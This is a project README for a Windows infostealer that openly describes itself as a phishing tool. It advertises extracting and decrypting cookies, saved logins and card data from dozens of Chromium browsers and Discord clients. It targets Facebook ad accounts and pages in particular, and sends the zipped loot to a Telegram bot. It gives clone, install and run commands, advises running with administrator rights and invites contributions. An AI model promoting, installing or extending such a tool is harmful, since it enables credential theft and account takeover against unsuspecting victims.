# Browser Data Extractor and Facebook Phishing Tool

This Python script is designed to extract browser data, including cookies and login credentials, from various browsers installed on a Windows system. It specifically targets Facebook-related data for phishing purposes. This will show you Data in your Terminal.

## Features

- **Browser Support:** Supports a wide range of Chromium-based browsers, including Chrome, Edge, Brave, and more.
- **Data Extraction:** Extracts cookies, login credentials, and other sensitive data from browsers.
- **Facebook Focus:** Specifically targets Facebook-related data, including ad account information and page details.
- **Encryption Handling:** Decrypts encrypted browser data using various encryption methods.

## Requirements

- Python 3.x
- Required Python packages: `os`, `json`, `base64`, `sqlite3`, `shutil`, `requests`, `glob`, `re`, `zipfile`, `io`, `hmac`, `time`, `random`, `platform`, `binascii`, `sys`, `ctypes`, `struct`, `pathlib`, `pyasn1`, `Crypto.Cipher`, `win32crypt`, `smbprotocol`, `pypsexec`, `windows`, `windows.security`, `windows.crypto`, `windows.generated_def`

## Installation

1. Clone the repository:
   ```sh
   git clone https://github.com/mohidqx/BDEFTP
   cd BDEFTP
   ```

2. Install the required Python packages:
   ```sh
   pip install -r requirements.txt
   ```

## Usage

3. **Run the Script:**
   ```sh
   python f85ac9c50edd8b033e853d9d9178cd5da11cdcb492da288933976ed9775180f9.py
   ```

## Functionality

### Browser Data Extraction

The script identifies and extracts data from the following browsers:
- Chromium
- Thorium
- Chrome
- Chrome (x86)
- Chrome SxS
- Maple
- Iridium
- 7Star
- CentBrowser
- Chedot
- Vivaldi
- Kometa
- Elements
- Epic Privacy Browser
- Uran
- Fenrir
- Catalina
- Coowon
- Liebao
- QIP Surf
- Orbitum
- Dragon
- 360Browser
- Maxthon
- K-Melon
- Brave
- Amigo
- Torch
- Sputnik
- Edge
- DCBrowser
- Yandex
- UR Browser
- Slimjet
- Opera
- OperaGX
- Speed360
- QQBrowser
- Sogou
- Discord
- Discord Canary
- Lightcord
- Discord PTB

### Data Processing

- **Cookies and Login Data:** The script decrypts and extracts cookies and login credentials from the identified browsers.
- **Facebook Data:** It specifically looks for Facebook-related data, including ad account information, page details, and user credentials.

## Example Output

The script will send a message to the Telegram bot with the following format:
```
country : City-Region-Country
ID : UniqueID OSInfo
Username: ComputerName UserName
CK: NumberOfCookies | Card: NumberOfCards
--------------------
ExtractedFacebookData
Count T33333333
```

## Notes

- Ensure that the script is run with administrative privileges to access all necessary browser data.
- The script handles various encryption methods used by different browsers, including AES, 3DES, and ChaCha20-Poly1305.
- The extracted data is stored temporarily in the `Browsers Data` directory before being zipped and sent to Telegram.

## Contributing

Feel free to contribute to this project by opening issues or pull requests. Any improvements or additional browser support are welcome!

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```
Made with ❤️ by [r00t:~#]
```
